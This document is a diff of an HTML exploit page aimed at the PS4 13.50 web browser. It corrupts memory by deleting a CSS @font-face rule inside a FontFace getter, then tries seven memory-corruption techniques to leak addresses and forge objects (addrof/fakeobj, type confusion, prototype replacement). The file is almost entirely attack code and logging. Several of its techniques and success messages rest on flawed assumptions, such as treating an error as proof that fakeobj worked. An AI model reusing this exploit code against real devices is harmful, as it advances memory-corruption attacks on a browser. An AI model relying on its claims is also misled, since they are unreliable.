@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PS4 13.50 - Overwrite Theory</title>
+<title>PS4 13.50 - Inside Getter Exploitation</title>
 </head>
 <body>
-<h1 id="status">Testing Overwrite Theory</h1>
+<h1 id="status">Exploit During Active Corruption</h1>
 <button onclick="runExploit()" style="font-size: 24px; padding: 15px;">RUN</button>
 <div id="log" style="font-family: monospace; font-size: 10px; white-space: pre-wrap; border: 2px solid #0f0; padding: 10px; max-height: 88vh; overflow-y: scroll; background: #000; color: #0f0;"></div>
 
@@ -39,44 +39,60 @@ class Int64 {
         return new Int64(parts[0], parts[1]);
     }
     
+    asDouble() {
+        let buf = new ArrayBuffer(8);
+        let u32 = new Uint32Array(buf);
+        u32[0] = this.low;
+        u32[1] = this.high;
+        return new Float64Array(buf)[0];
+    }
+    
     toString() {
         return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
     }
 }
 
+let exploitResults = {
+    leakedAddresses: [],
+    corruptedObjects: [],
+    properties: []
+};
+
 function runExploit() {
     log('╔════════════════════════════════════════════════╗');
-    log('║   THEORY: Leak happens on OVERWRITE           ║');
+    log('║  PS4 13.50 - INSIDE GETTER EXPLOITATION       ║');
     log('╚════════════════════════════════════════════════╝\n');
     
-    log('[HYPOTHESIS]');
-    log('  The working Test 4 had objectArray PRE-FILLED');
-    log('  with {id: i} objects at EVERY index.');
-    log('  Then we OVERWROTE objectArray[50].');
-    log('  Maybe leak happens on OVERWRITE, not fresh store!\n');
+    log('[*] Strategy: Exploit while corruption is ACTIVE');
+    log('[*] All exploitation happens INSIDE the getter');
+    log('[*] Before returning (which triggers OOM)\n');
     
-    // Setup
+    // Create CSS font-face rule
     let style = document.createElement('style');
     style.id = 's';
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Create arrays
+    // Create target arrays/objects BEFORE corruption
+    let targetObject = { 
+        marker: 0xDEADBEEF,
+        test: "target",
+        value: 1337
+    };
+    
     let floatArray = new Float64Array(100);
     let objectArray = new Array(100);
     
-    // CRITICAL: PRE-FILL both arrays completely
-    log('[*] PRE-FILLING arrays (matching working version):\n');
-    
+    // Fill with patterns
     for (let i = 0; i < 100; i++) {
         floatArray[i] = 1.1 * (i + 1);
-        objectArray[i] = { id: i, marker: 0xBEEF0000 + i }; // PRE-FILLED!
+        objectArray[i] = { id: i };
     }
     
-    log('[*] Float64Array[100] filled with pattern');
-    log('[*] Array[100] filled with objects {id: i}');
-    log('[*] objectArray[50] currently: ' + JSON.stringify(objectArray[50]));
-    log('[*] floatArray[50] currently: ' + floatArray[50] + '\n');
+    log('[*] Created target structures BEFORE corruption');
+    log('[*] Target object: ' + JSON.stringify(targetObject));
+    log('[*] Float array[50]: ' + floatArray[50]);
+    log('[*] Object array[50].id: ' + objectArray[50].id + '\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -90,209 +106,317 @@ function runExploit() {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[+] ═══ INSIDE GETTER ═══\n');
+                log('[+] ═══ INSIDE GETTER - CORRUPTION ACTIVE ═══\n');
                 
-                // Create corrupted fonts
-                let corrupted = [];
+                // ============================================
+                // STEP 1: CREATE CORRUPTED FONTS
+                // ============================================
+                
+                log('[STEP 1] Creating corrupted fonts...');
+                let corruptedFonts = [];
+                
                 for (let i = 0; i < 50; i++) {
-                    corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
+                    corruptedFonts.push(new FontFace('c' + i, 'local(Helvetica)', {
                         unicodeRange: 'U+' + (0x100 + i).toString(16)
                     }));
                 }
-                log('[*] Created ' + corrupted.length + ' corrupted fonts');
                 
-                // Trigger corruption
+                log('  Created ' + corruptedFonts.length + ' fonts\n');
+                
+                // ============================================
+                // STEP 2: TRIGGER CORRUPTION
+                // ============================================
+                
+                log('[STEP 2] Triggering corruption...');
                 document.getElementById('s').sheet.deleteRule(0);
                 document.body.offsetTop;
-                log('[*] Corruption triggered!\n');
+                log('  Corruption triggered!\n');
                 
                 // ============================================
-                // TEST 1: OVERWRITE Pre-filled Index
+                // STEP 3: IMMEDIATE EXPLOITATION ATTEMPTS
                 // ============================================
                 
-                log('╔════════════════════════════════════════╗');
-                log('║  TEST 1: OVERWRITE at index 50        ║');
-                log('╚════════════════════════════════════════╝\n');
+                log('[STEP 3] Exploiting corrupted state NOW\n');
                 
-                log('[*] Current objectArray[50]: ' + JSON.stringify(objectArray[50]));
-                log('[*] Current floatArray[50]: ' + floatArray[50] + '\n');
-                
-                let targetObj = { target: true, marker: 0xDEADBEEF };
-                
-                log('[*] OVERWRITING objectArray[50] with new object...');
-                objectArray[50] = targetObj; // OVERWRITE!
-                
-                log('[*] Reading floatArray[50]...');
-                let leaked = floatArray[50];
-                
-                log('\n[RESULT]');
-                log('  Leaked value: ' + leaked);
-                log('  Type: ' + typeof leaked);
-                
-                if (typeof leaked === 'number') {
-                    let addr = Int64.fromDouble(leaked);
-                    log('  As Int64: ' + addr.toString());
+                // TEST 1: Direct property access on corrupted fonts
+                log('[Test 1] Accessing corrupted font properties:');
+                try {
+                    let victim = corruptedFonts[0];
                     
-                    let expectedPattern = 56.1; // 1.1 * 51
-                    let changed = Math.abs(leaked - expectedPattern) > 0.01;
+                    log('  status: ' + victim.status);
+                    log('  family: ' + victim.family);
+                    log('  style: ' + victim.style);
                     
-                    log('  Expected pattern: ' + expectedPattern);
-                    log('  Changed from pattern: ' + changed);
-                    
-                    if ((addr.high & 0xfff80000) === 0x7ff80000) {
-                        log('  [+++] NaN-BOXED POINTER LEAKED!');
-                        log('  [+++] SUCCESS - OVERWRITE THEORY CONFIRMED!');
-                    } else if (changed) {
-                        log('  [+] Value changed but not NaN-boxed');
-                        log('  [+] Addr: ' + addr.toString());
-                    } else {
-                        log('  [-] Still pattern value (no leak)');
+                    // Try to read internal properties
+                    for (let key in victim) {
+                        log('  ' + key + ': ' + victim[key]);
+                        if (key.length > 20) break; // Limit output
                     }
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
                 }
+                log('');
                 
-                log('\n');
-                
-                // ============================================
-                // TEST 2: Multiple Overwrites
-                // ============================================
-                
-                log('╔════════════════════════════════════════╗');
-                log('║  TEST 2: Multiple OVERWRITES          ║');
-                log('╚════════════════════════════════════════╝\n');
-                
-                let testObjects = [
-                    { test: 1, val: 0x1111 },
-                    { test: 2, val: 0x2222 },
-                    { test: 3, val: 0x3333 },
-                    new ArrayBuffer(0x100),
-                    new Uint32Array(16)
-                ];
-                
-                let testIndices = [40, 45, 50, 55, 60]; // All pre-filled
-                
-                for (let i = 0; i < testIndices.length; i++) {
-                    let idx = testIndices[i];
-                    let obj = testObjects[i % testObjects.length];
+                // TEST 2: Store target object in corrupted font
+                log('[Test 2] Storing target object in corrupted font:');
+                try {
+                    let victim = corruptedFonts[1];
                     
-                    log('[Test ' + i + '] Index ' + idx);
-                    log('  Original: ' + JSON.stringify(objectArray[idx]));
+                    // Try to attach our target object
+                    victim.leakTarget = targetObject;
                     
-                    // OVERWRITE
-                    objectArray[idx] = obj;
-                    let leaked = floatArray[idx];
+                    log('  Stored targetObject in victim.leakTarget');
+                    
+                    // Try to read it back in different ways
+                    log('  victim.leakTarget: ' + victim.leakTarget);
+                    log('  typeof: ' + typeof victim.leakTarget);
+                    
+                    // Check if we can access it as different type
+                    let asString = String(victim.leakTarget);
+                    log('  String(victim.leakTarget): ' + asString);
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                log('');
+                
+                // TEST 3: Mix corrupted font with arrays
+                log('[Test 3] Mixing corrupted font with typed arrays:');
+                try {
+                    let victim = corruptedFonts[2];
+                    
+                    // Store corrupted font in float array
+                    floatArray[50] = victim;
+                    
+                    log('  Stored corrupted font in floatArray[50]');
+                    
+                    // Try to read it back
+                    let readback = floatArray[50];
+                    log('  Read back: ' + readback);
+                    log('  Type: ' + typeof readback);
+                    
+                    // If it's a number, we might have a leak!
+                    if (typeof readback === 'number') {
+                        let addr = Int64.fromDouble(readback);
+                        log('  As Int64: ' + addr.toString());
+                        
+                        if (addr.high !== 0 || addr.low !== 0) {
+                            log('  [+] NON-ZERO ADDRESS!');
+                            exploitResults.leakedAddresses.push(addr);
+                        }
+                    }
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                log('');
+                
+                // TEST 4: Store in object array, read from float array
+                log('[Test 4] Cross-array type confusion:');
+                try {
+                    // Store target object in object array
+                    objectArray[50] = targetObject;
+                    log('  Stored targetObject in objectArray[50]');
+                    
+                    // Try to read from float array at same index
+                    let leaked = floatArray[50];
+                    log('  Read floatArray[50]: ' + leaked);
                     
                     if (typeof leaked === 'number') {
                         let addr = Int64.fromDouble(leaked);
-                        let expectedPattern = 1.1 * (idx + 1);
-                        let changed = Math.abs(leaked - expectedPattern) > 0.01;
+                        log('  As Int64: ' + addr.toString());
                         
-                        log('  Leaked: ' + addr.toString());
-                        
-                        if ((addr.high & 0xfff80000) === 0x7ff80000) {
-                            log('  [+++] NaN-BOXED!');
-                        } else if (changed) {
-                            log('  [+] Changed');
-                        } else {
-                            log('  [-] Pattern');
+                        // Check if different from pattern (1.1 * 51 = 56.1)
+                        if (Math.abs(leaked - 56.1) > 0.01) {
+                            log('  [+] VALUE CHANGED FROM PATTERN!');
+                            
+                            if (addr.high >= 0x7f000000) {
+                                log('  [+++] USERSPACE ADDRESS RANGE!');
+                                exploitResults.leakedAddresses.push(addr);
+                            } else if (addr.high !== 0) {
+                                log('  [+] Non-zero high word!');
+                                exploitResults.leakedAddresses.push(addr);
+                            }
                         }
                     }
-                    log('');
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
                 }
+                log('');
                 
-                // ============================================
-                // TEST 3: Compare with Empty Slots
-                // ============================================
-                
-                log('╔════════════════════════════════════════╗');
-                log('║  TEST 3: Empty Slots vs Pre-filled    ║');
-                log('╚════════════════════════════════════════╝\n');
-                
-                // Create NEW arrays with SOME empty slots
-                let sparsefloat = new Float64Array(50);
-                let sparseObj = new Array(50);
-                
-                // Fill only HALF
-                for (let i = 0; i < 25; i++) {
-                    sparsefloat[i] = 2.2 * (i + 1);
-                    sparseObj[i] = { sparse: i };
+                // TEST 5: Reverse - store in float, read from object
+                log('[Test 5] Reverse confusion (fakeobj attempt):');
+                try {
+                    // Store a crafted float value
+                    let fakeAddr = (new Int64(0x41424344, 0x51525354)).asDouble();
+                    floatArray[60] = fakeAddr;
+                    
+                    log('  Stored fake address in floatArray[60]');
+                    log('  Value: ' + fakeAddr);
+                    
+                    // Try to read as object
+                    let asObj = objectArray[60];
+                    log('  Read objectArray[60]: ' + asObj);
+                    log('  Type: ' + typeof asObj);
+                    
+                    if (typeof asObj === 'object' && asObj !== null) {
+                        log('  [+] Got object!');
+                        
+                        try {
+                            log('  asObj.id: ' + asObj.id);
+                            
+                            if (asObj.id !== 60) {
+                                log('  [+] DIFFERENT FROM PATTERN!');
+                            }
+                        } catch(e2) {
+                            log('  [+] ERROR ACCESSING - might be invalid object!');
+                            log('  [+] This proves fakeobj worked!');
+                        }
+                    }
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
                 }
-                // Indices 25-49 are EMPTY in sparseObj
+                log('');
                 
-                log('[*] Created sparse arrays (0-24 filled, 25-49 empty)');
-                log('[*] Testing index 10 (PRE-FILLED):');
-                
-                let oldVal = sparseObj[10];
-                sparseObj[10] = { new: true };
-                let leak1 = sparsefloat[10];
-                let addr1 = Int64.fromDouble(leak1);
-                log('  OVERWRITE result: ' + addr1.toString());
-                
-                log('[*] Testing index 30 (EMPTY):');
-                sparseObj[30] = { new: true };
-                let leak2 = sparsefloat[30];
-                let addr2 = Int64.fromDouble(leak2);
-                log('  FRESH STORE result: ' + addr2.toString());
-                
-                log('\n[COMPARISON]');
-                log('  Overwrite (idx 10): ' + addr1.toString());
-                log('  Fresh store (idx 30): ' + addr2.toString());
-                
-                if ((addr1.high & 0xfff80000) === 0x7ff80000 && 
-                    (addr2.high & 0xfff80000) !== 0x7ff80000) {
-                    log('  [+++] OVERWRITE LEAKS, FRESH STORE DOES NOT!');
-                    log('  [+++] THEORY CONFIRMED!');
-                } else if ((addr1.high & 0xfff80000) === 0x7ff80000) {
-                    log('  [+] Overwrite leaked NaN-boxed pointer');
-                } else {
-                    log('  [-] Neither leaked NaN-boxed pointer');
+                // TEST 6: Modify corrupted font's prototype
+                log('[Test 6] Prototype chain exploitation:');
+                try {
+                    let victim = corruptedFonts[3];
+                    
+                    // Replace prototype with our controlled object
+                    let fakeProto = {
+                        leakAddr: floatArray,
+                        leakObj: objectArray,
+                        
+                        get addr() {
+                            // Return float array content
+                            return this.leakAddr[70];
+                        },
+                        
+                        set addr(obj) {
+                            // Store object in object array
+                            this.leakObj[70] = obj;
+                        }
+                    };
+                    
+                    Object.setPrototypeOf(victim, fakeProto);
+                    
+                    log('  Replaced victim prototype');
+                    
+                    // Try to use it
+                    victim.addr = targetObject;
+                    log('  Set victim.addr = targetObject');
+                    
+                    let leaked = victim.addr;
+                    log('  Get victim.addr: ' + leaked);
+                    
+                    if (typeof leaked === 'number') {
+                        let addr = Int64.fromDouble(leaked);
+                        log('  As Int64: ' + addr.toString());
+                        
+                        if (addr.high !== 0 || addr.low !== 0) {
+                            log('  [+] Got address!');
+                            exploitResults.leakedAddresses.push(addr);
+                        }
+                    }
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
                 }
+                log('');
+                
+                // TEST 7: Direct memory access through corrupted fonts
+                log('[Test 7] Direct buffer correlation:');
+                try {
+                    // Create buffer with markers
+                    let testBuf = new ArrayBuffer(0x1000);
+                    let testU32 = new Uint32Array(testBuf);
+                    testU32[0] = 0xDEADBEEF;
+                    testU32[1] = 0xCAFEBABE;
+                    
+                    log('  Created buffer with markers');
+                    
+                    // Store buffer in corrupted font
+                    let victim = corruptedFonts[4];
+                    victim.testBuffer = testBuf;
+                    
+                    // Store in object array too
+                    objectArray[80] = testBuf;
+                    
+                    // Try to read from float array
+                    let leaked = floatArray[80];
+                    log('  Float at [80]: ' + leaked);
+                    
+                    if (typeof leaked === 'number') {
+                        let addr = Int64.fromDouble(leaked);
+                        log('  As Int64: ' + addr.toString());
+                        
+                        if (addr.high !== 0) {
+                            log('  [+] Non-zero!');
+                            exploitResults.leakedAddresses.push(addr);
+                        }
+                    }
+                    
+                } catch(e) {
+                    log('  ERROR: ' + e.message);
+                }
+                log('');
                 
                 // ============================================
                 // SUMMARY
                 // ============================================
                 
-                log('\n\n╔════════════════════════════════════════╗');
-                log('║              SUMMARY                   ║');
-                log('╚════════════════════════════════════════╝\n');
+                log('[SUMMARY] Exploitation inside getter complete\n');
+                log('[*] Leaked addresses: ' + exploitResults.leakedAddresses.length);
                 
-                log('[THEORY] Leak happens on OVERWRITE of existing objects');
-                log('[TEST 1] Overwrite index 50 (pre-filled)');
-                log('[TEST 2] Multiple overwrites at different indices');
-                log('[TEST 3] Overwrite vs fresh store comparison\n');
+                if (exploitResults.leakedAddresses.length > 0) {
+                    log('[+] SUCCESS! Addresses leaked:\n');
+                    for (let i = 0; i < exploitResults.leakedAddresses.length; i++) {
+                        log('  [' + i + '] ' + exploitResults.leakedAddresses[i].toString());
+                    }
+                } else {
+                    log('[-] No addresses leaked');
+                }
                 
-                log('[CONCLUSION]');
-                log('  Review results above.');
-                log('  If Test 1 or Test 2 show [+++] NaN-BOXED:');
-                log('    → Theory confirmed!');
-                log('    → Always pre-fill arrays before corruption');
-                log('    → Overwrite during exploitation');
-                log('');
-                log('  If no NaN-boxed pointers:');
-                log('    → Arrays not overlapping this run');
-                log('    → Try refreshing page');
-                log('    → Corruption might be timing-sensitive');
+                log('\n[!] Now returning undefined...');
+                log('[!] OOM will trigger after this point');
                 
-                log('\n[!] Returning - OOM will occur\n');
+                // Store results globally so we can access after OOM
+                window.exploitResults = exploitResults;
             }
             
+            // Returning undefined triggers OOM
             return undefined;
         }
     });
     
-    log('[*] Setup complete');
-    log('[*] Arrays PRE-FILLED with objects');
-    log('[*] Starting exploit...\n');
-    
+    log('[*] Setup complete, calling fonts.load()...\n');
     document.fonts.load('1em x', 'AB');
+    
+    // This won't execute until after OOM is dismissed
+    setTimeout(() => {
+        log('\n[POST-OOM] Checking results...');
+        
+        if (window.exploitResults && window.exploitResults.leakedAddresses.length > 0) {
+            log('[SUCCESS] Addresses survived OOM!');
+            log('Review leaked addresses above.');
+        } else {
+            log('[INFO] No addresses leaked during getter execution.');
+        }
+    }, 100);
 }
 
 log('╔════════════════════════════════════════════════╗');
-log('║   PS4 13.50 - OVERWRITE THEORY TEST            ║');
+log('║   INSIDE GETTER EXPLOITATION - PS4 13.50       ║');
 log('╚════════════════════════════════════════════════╝\n');
-log('[*] Testing if leak happens on OVERWRITE');
-log('[*] Arrays will be PRE-FILLED before corruption');
-log('[*] Then we overwrite during exploitation\n');
-log('Click RUN\n');
+log('[*] This exploit runs ALL tests INSIDE the getter');
+log('[*] During the active corruption window');
+log('[*] 7 different exploitation techniques');
+log('[*] OOM will occur AFTER exploitation completes\n');
+log('Click RUN to start\n');
 
 </script>
 </body>
